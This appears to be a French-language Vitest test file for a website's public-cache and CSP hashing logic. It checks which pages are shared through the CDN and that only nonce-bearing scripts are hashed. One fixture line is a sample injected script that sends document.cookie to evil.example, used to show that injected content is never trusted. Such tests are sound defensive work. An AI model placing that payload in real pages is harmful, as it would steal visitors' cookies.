// @vitest-environment node
import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";

import {
  CDN_CACHE_CONTROL,
  DEGRADED_RESPONSE_HEADER,
  SHELL_LOCALE_HEADER,
  SHELL_THEME_HEADER,
  isShareableSummaryRequest,
  isSummaryPath,
  replaceNonceWithHashes,
  toCacheableSummary,
  withoutInternalMarks,
} from "@/shared/lib/public-cache";
import { buildContentSecurityPolicy } from "@/shared/lib/csp";

const NONCE = "5f0c2a7e-1111-4222-8333-944455556666";
const sha = (text: string) => `sha256-${createHash("sha256").update(text).digest("base64")}`;

const BOOT = "self.$_TSR={h(){}};";
const STREAM = "document.currentScript.remove();";
const INJECTED = "fetch('https://evil.example/'+document.cookie)";

/** Une page comme celles que rend TanStack Start, plus un script arrivé par le contenu. */
function page(nonce = NONCE): string {
  return [
    `<!DOCTYPE html><html><head><meta name="description" content="x" nonce="${nonce}"/>`,
    `<link rel="modulepreload" href="/assets/a.js" nonce="${nonce}"/>`,
    `<script type="application/ld+json" nonce="${nonce}">{"@type":"ItemList"}</script>`,
    `</head><body><p>Programme</p>`,
    `<script>${INJECTED}</script>`,
    `<script nonce="${nonce}" data-tsr-stream-part="">${BOOT}</script>`,
    `<script type="module" async="" src="/assets/index-x.js" nonce="${nonce}"></script>`,
    `<script nonce="${nonce}">${STREAM}</script>`,
    `</body></html>`,
  ].join("");
}

function summaryRequest(path: string, headers: Record<string, string> = {}): Request {
  return new Request(`https://www.na9ranal3ab.tn${path}`, { headers });
}

function ssrResponse(init: { status?: number; headers?: Record<string, string> } = {}) {
  return new Response(page(), {
    status: init.status ?? 200,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "content-security-policy": buildContentSecurityPolicy(NONCE),
      "cache-control": "public, max-age=0, must-revalidate",
      ...init.headers,
    },
  });
}

describe("public-cache — quelles pages", () => {
  it("ne retient que les sommaires : accueil, programme, lycée, niveaux", () => {
    for (const path of ["/", "/programme", "/programme/lycee/2eme", "/niveau/concours-6eme"]) {
      expect(isSummaryPath(path), path).toBe(true);
    }
  });

  it("laisse au rendu par visite toute page de contenu, et tout le reste", () => {
    for (const path of [
      "/matiere/math",
      "/chapitre/e602ea95-36fe-5fdd-b6bc-3c71484ff81c",
      "/exercice/eb9749ae-771e-5c17-8c92-e4d9d3883622",
      "/niveau/a/b",
      "/programme/lycee",
      "/dashboard",
      "/extras",
      "/test-de-niveau",
    ]) {
      expect(isSummaryPath(path), path).toBe(false);
    }
  });
});

describe("public-cache — la variante de la requête", () => {
  it("accepte une requête dont le routage a recopié les cookies", () => {
    const request = summaryRequest("/niveau/x", {
      cookie: "_ga=GA1.1; xp-scholars-locale=ar; xp-scholars-theme=dark",
      [SHELL_LOCALE_HEADER]: "ar",
      [SHELL_THEME_HEADER]: "dark",
    });
    expect(isShareableSummaryRequest(request)).toBe(true);
  });

  it("accepte le visiteur sans cookie, sur les valeurs par défaut", () => {
    const request = summaryRequest("/", {
      [SHELL_LOCALE_HEADER]: "fr",
      [SHELL_THEME_HEADER]: "reference",
    });
    expect(isShareableSummaryRequest(request)).toBe(true);
  });

  it("refuse sans les en-têtes du routage (poste local, autre hébergeur)", () => {
    expect(isShareableSummaryRequest(summaryRequest("/"))).toBe(false);
  });

  it("refuse quand l'en-tête ne dit pas la même langue que le cookie — jamais la page d'un autre", () => {
    const request = summaryRequest("/", {
      cookie: "xp-scholars-locale=ar",
      [SHELL_LOCALE_HEADER]: "fr",
      [SHELL_THEME_HEADER]: "reference",
    });
    expect(isShareableSummaryRequest(request)).toBe(false);
  });

  it("refuse une requête authentifiée, une méthode autre que GET, une page de contenu", () => {
    const variant = { [SHELL_LOCALE_HEADER]: "fr", [SHELL_THEME_HEADER]: "reference" };
    expect(
      isShareableSummaryRequest(summaryRequest("/", { ...variant, authorization: "Bearer t" })),
    ).toBe(false);
    expect(
      isShareableSummaryRequest(
        new Request("https://www.na9ranal3ab.tn/", { method: "HEAD", headers: variant }),
      ),
    ).toBe(false);
    expect(isShareableSummaryRequest(summaryRequest("/matiere/math", variant))).toBe(false);
  });
});

describe("public-cache — le nonce devient des empreintes", () => {
  it("empreint les seuls scripts exécutables qui portaient le nonce de la requête", async () => {
    const result = await replaceNonceWithHashes(page(), NONCE);
    expect(result).not.toBeNull();
    expect(result?.hashes.sort()).toEqual([sha(BOOT), sha(STREAM)].sort());
  });

  it("ne donne JAMAIS d'empreinte au script arrivé par le contenu", async () => {
    const result = await replaceNonceWithHashes(page(), NONCE);
    expect(result?.hashes).not.toContain(sha(INJECTED));
  });

  it("retire le nonce de toutes les balises : il ne doit pas survivre dans une page partagée", async () => {
    const result = await replaceNonceWithHashes(page(), NONCE);
    expect(result?.html).not.toContain(NONCE);
    expect(result?.html).toContain(`<script>${INJECTED}</script>`);
  });

  // Alerte CodeQL de la PR #1322 (« bad HTML filtering regexp ») : une balise de fin
  // `</script foo>` termine le script pour le navigateur. Si l'analyse ne la reconnaît pas,
  // elle déborde sur le script suivant et calcule une empreinte fausse — le script du
  // framework est alors refusé et la page ne s'hydrate plus.
  it("reconnaît toute balise de fin que le navigateur reconnaît", async () => {
    const html = [
      `<p>x</p><script>${INJECTED}</script\t\nfoo>`,
      `<script nonce="${NONCE}">${BOOT}</script >`,
      `<script nonce="${NONCE}">${STREAM}</SCRIPT>`,
    ].join("");
    const result = await replaceNonceWithHashes(html, NONCE);
    expect(result?.hashes.sort()).toEqual([sha(BOOT), sha(STREAM)].sort());
  });

  it("rend `null` sur une page qui ne porte pas le nonce attendu", async () => {
    expect(await replaceNonceWithHashes(page("autre"), NONCE)).toBeNull();
  });
});

describe("public-cache — la réponse partagée", () => {
  it("part au CDN avec une CSP par empreintes, sans nonce ni 'unsafe-inline'", async () => {
    const response = await toCacheableSummary(ssrResponse());
    const csp = response.headers.get("content-security-policy") ?? "";
    const scriptSrc = csp.split("; ").find((d) => d.startsWith("script-src ")) ?? "";

    expect(response.headers.get("vercel-cdn-cache-control")).toBe(CDN_CACHE_CONTROL);
    expect(response.headers.get("cache-control")).toBe("public, max-age=0, must-revalidate");
    expect(response.headers.get("vary")).toBe(`${SHELL_LOCALE_HEADER}, ${SHELL_THEME_HEADER}`);
    expect(scriptSrc).toContain(`'${sha(BOOT)}'`);
    expect(scriptSrc).toContain(`'${sha(STREAM)}'`);
    expect(scriptSrc).not.toContain(sha(INJECTED));
    expect(scriptSrc).not.toContain("nonce-");
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(await response.text()).not.toContain(NONCE);
  });

  it("garde la page d'une panne de préchargement hors du cache", async () => {
    const upstream = ssrResponse({ headers: { [DEGRADED_RESPONSE_HEADER]: "1" } });
    const response = await toCacheableSummary(upstream);
    expect(response).toBe(upstream);
    expect(withoutInternalMarks(response).headers.has(DEGRADED_RESPONSE_HEADER)).toBe(false);
  });

  it("garde hors du cache une réponse qui pose un cookie, un 404, ce qui n'est pas du HTML", async () => {
    for (const upstream of [
      ssrResponse({ headers: { "set-cookie": "a=b" } }),
      ssrResponse({ status: 404 }),
      ssrResponse({ headers: { "content-type": "application/json" } }),
    ]) {
      const response = await toCacheableSummary(upstream);
      expect(response).toBe(upstream);
      expect(response.headers.has("vercel-cdn-cache-control")).toBe(false);
    }
  });
});
